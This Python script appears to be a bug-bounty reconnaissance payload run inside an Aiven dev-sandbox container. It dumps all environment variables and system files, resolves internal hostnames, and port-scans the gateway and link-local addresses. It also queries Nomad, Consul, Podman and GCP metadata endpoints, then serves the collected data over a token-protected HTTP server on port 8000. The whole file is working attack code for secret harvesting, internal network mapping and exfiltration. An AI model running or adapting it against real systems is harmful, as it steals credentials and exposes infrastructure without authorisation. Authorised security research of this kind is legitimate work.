import json, os, socket, threading, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"
CACHE = {"status": "warming-up"}
FQ = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
PG = "pg-reaudit1-test12345323456-ae5b.l.aivencloud.com"
GW = "10.156.0.1"

def tcp(target, port, timeout=3):
    try:
        s = socket.create_connection((target, port), timeout=timeout)
        s.settimeout(2)
        try:
            d = s.recv(64)
            first = d.hex() if d else "connect-ok-no-data"
        except Exception as e:
            first = "connect-ok-read:" + type(e).__name__
        s.close()
        return {"tcp": "ok", "first_bytes": first}
    except Exception as e:
        return {"tcp": type(e).__name__ + ": " + str(e)}

def portscan(target, ports):
    return {str(p): tcp(target, p, 2) for p in ports}

def http(url, headers=None, method="GET", timeout=3):
    try:
        class NR(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a): return None
        op = urllib.request.build_opener(NR)
        req = urllib.request.Request(url, headers=headers or {}, method=method)
        r = op.open(req, timeout=timeout)
        return {"status": r.status, "body": r.read(500).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        try:
            body = e.read(500).decode("utf-8", "replace")
        except Exception:
            body = ""
        return {"status": e.code, "body": body}
    except Exception as e:
        return {"error": type(e).__name__ + ": " + str(e)}

def safe(p, n=1000):
    try:
        return open(p).read()[:n]
    except Exception as e:
        return type(e).__name__

def out(target):
    try:
        return socket.gethostbyname(target) + " resolved"
    except Exception as e:
        return type(e).__name__

def run_all():
    o = {}
    o["env"] = dict(os.environ)
    o["hostname"] = socket.gethostname()
    o["resolv_conf"] = safe("/etc/resolv.conf")
    o["hosts"] = safe("/etc/hosts")
    o["route"] = safe("/proc/net/route")
    o["fib_trie"] = safe("/proc/net/fib_trie", 1500)
    o["status_proc"] = safe("/proc/self/status", 1600)
    o["mounts"] = safe("/proc/self/mounts")
    o["dns_falcon"] = out(FQ)
    o["dns_own_pg"] = out(PG)
    o["dns_falcon_internal"] = out("falcon-1.dev-sandbox.aiven.local")
    o["dns_internal_devsandbox"] = out("falcon.dev-sandbox.aiven.local")
    o["dns_internal_main"] = out("main.aiven.local")
    o["tcp_falcon_33046"] = tcp("129.213.46.149", 33046)
    o["tcp_own_pg_26247"] = tcp(PG, 26247)
    o["tcp_internet_1111_443"] = tcp("1.1.1.1", 443)
    o["tcp_imds_80"] = tcp("169.254.169.254", 80)
    o["scan_gw"] = portscan(GW, [22, 53, 443, 2375, 2376, 2377, 4646, 4647, 8500, 8600, 8000, 8080, 9090, 5545])
    o["scan_imds_resolv"] = portscan("169.254.1.1", [22, 53, 443, 2375, 2376, 4646, 4647, 8500, 8080])
    o["http_gw_nomad"] = http("http://" + GW + ":4646/v1/agent/self")
    o["http_gw_nomad_nodes"] = http("http://" + GW + ":4646/v1/nodes")
    o["http_gw_podman"] = http("http://" + GW + ":2375/_ping")
    o["http_gw_consul"] = http("http://" + GW + ":8500/v1/kv/?keys")
    o["http_nomad_254_1_1"] = http("http://169.254.1.1:4646/v1/agent/self")
    o["http_nomad_254_1_1_nodes"] = http("http://169.254.1.1:4646/v1/nodes")
    o["http_gcp_metadata"] = http("http://metadata.google.internal/computeMetadata/v1/",
        {"Metadata-Flavor": "Google"})
    return o

def loop():
    while True:
        try:
            CACHE.update(run_all())
        except Exception as e:
            CACHE["loop_error"] = type(e).__name__ + ": " + str(e)
        threading.Event().wait(45)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(CACHE, default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

threading.Thread(target=loop, daemon=True).start()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
